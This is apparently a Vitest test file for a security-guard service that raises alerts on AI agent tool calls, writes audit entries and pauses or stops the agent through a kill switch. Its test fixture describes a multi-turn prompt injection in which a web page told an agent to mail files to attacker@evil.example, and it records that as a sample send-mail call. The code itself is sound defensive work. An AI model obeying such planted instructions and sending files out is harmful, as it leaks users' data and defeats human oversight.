import { mkdtemp } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { describe, expect, it, vi } from 'vitest';
import { DEFAULT_GUARD_CONFIG, DEFAULT_GUARD_SYSTEM_PROMPT, type KillLevel } from '@cw/shared';
import { SecurityGuardService, type RaiseInput } from './security.js';

const input = (over: Partial<RaiseInput> = {}): RaiseInput => ({
  id: '01JSECALERT00000000001',
  at: '2026-10-26T08:00:00Z',
  taskId: 'task-1',
  tool: 'gateway_mail__send',
  callSummary: 'gateway_mail__send(to=attacker@evil.example)',
  category: 'multi_turn_injection',
  confidence: 97,
  reason: 'A web page told the agent to mail files to attacker@evil.example.',
  haltLevel: 'stopped',
  ...over,
});

async function setup(level: KillLevel = 'normal', known = true) {
  const dir = await mkdtemp(path.join(os.tmpdir(), 'guard-'));
  const setAgent = vi.fn().mockResolvedValue(undefined);
  const write = vi.fn().mockResolvedValue(undefined);
  const make = () => new SecurityGuardService(dir, { get: () => (known ? ({} as never) : undefined) }, { effective: () => ({ level, source: 'none' }), setAgent }, { write });
  const svc = make();
  await svc.load();
  return { svc, setAgent, write, reload: async () => { const s = make(); await s.load(); return s; } };
}

describe('SecurityGuardService', () => {
  it('starts with the default policy and persists edits (with an audit entry that carries no prompt text)', async () => {
    const t = await setup();
    expect(t.svc.getConfig()).toEqual(DEFAULT_GUARD_CONFIG);
    const custom = `${DEFAULT_GUARD_SYSTEM_PROMPT}\n- Never allow mail to external domains.`;
    await t.svc.setConfig({ ...DEFAULT_GUARD_CONFIG, systemPrompt: custom, model: 'gpt-5.4-nano', failMode: 'allow' }, 'admin@example.com');
    expect((await t.reload()).getConfig()).toMatchObject({ systemPrompt: custom, model: 'gpt-5.4-nano', failMode: 'allow' });
    const entry = t.write.mock.calls.at(-1)![0];
    expect(entry).toMatchObject({ action: 'security.guard.config', by: 'admin@example.com', details: { promptChanged: true } });
    expect(JSON.stringify(entry)).not.toContain('Never allow mail');
  });

  it('rejects an invalid policy', async () => {
    const t = await setup();
    await expect(t.svc.setConfig({ ...DEFAULT_GUARD_CONFIG, systemPrompt: 'too short' }, 'a')).rejects.toThrow();
    await expect(t.svc.setConfig({ ...DEFAULT_GUARD_CONFIG, haltLevel: 'normal' }, 'a')).rejects.toThrow();
    await expect(t.svc.setConfig({ ...DEFAULT_GUARD_CONFIG, contextCalls: 50 }, 'a')).rejects.toThrow();
    expect(t.svc.getConfig()).toEqual(DEFAULT_GUARD_CONFIG);
  });

  it('records an alert, audits it and puts the agent on the guard level', async () => {
    const t = await setup();
    const r = await t.svc.raise('lara', input());
    expect(r.created).toBe(true);
    await r.enforcement;
    expect(t.svc.openCount()).toBe(1);
    expect(t.svc.list()[0]).toMatchObject({ agentId: 'lara', status: 'open', tool: 'gateway_mail__send', haltLevel: 'stopped' });
    expect(t.setAgent).toHaveBeenCalledWith('lara', 'stopped', expect.stringContaining('Security guard'), 'security-guard', expect.objectContaining({ rule: 'exfiltration-guard' }));
    expect(t.write).toHaveBeenCalledWith(expect.objectContaining({ action: 'security.alert', target: 'lara' }));
    expect((await t.reload()).openCount()).toBe(1); // survives a restart
  });

  it('is idempotent: a retried delivery neither duplicates the alert nor repeats the kill switch', async () => {
    const t = await setup();
    await (await t.svc.raise('lara', input())).enforcement;
    const again = await t.svc.raise('lara', input());
    expect(again.created).toBe(false);
    expect(t.svc.list()).toHaveLength(1);
    expect(t.setAgent).toHaveBeenCalledTimes(1);
  });

  it('never lowers an existing kill-switch level and ignores agents that no longer exist', async () => {
    const stopped = await setup('stopped');
    await (await stopped.svc.raise('lara', input({ haltLevel: 'paused' }))).enforcement;
    expect(stopped.setAgent).not.toHaveBeenCalled();
    const gone = await setup('normal', false);
    await (await gone.svc.raise('ghost', input())).enforcement;
    expect(gone.setAgent).not.toHaveBeenCalled();
    expect(gone.svc.openCount()).toBe(1); // the alert is still shown
  });

  it('acknowledges an alert once, with the administrator and a note', async () => {
    const t = await setup();
    await t.svc.raise('lara', input());
    const a = await t.svc.acknowledge('01JSECALERT00000000001', 'admin@example.com', 'Checked: the page was a test fixture');
    expect(a).toMatchObject({ status: 'acknowledged', acknowledgedBy: 'admin@example.com', note: 'Checked: the page was a test fixture' });
    expect(t.svc.openCount()).toBe(0);
    expect(t.svc.list('open')).toHaveLength(0);
    expect(await t.svc.acknowledge('nope', 'admin@example.com')).toBeUndefined();
  });
});
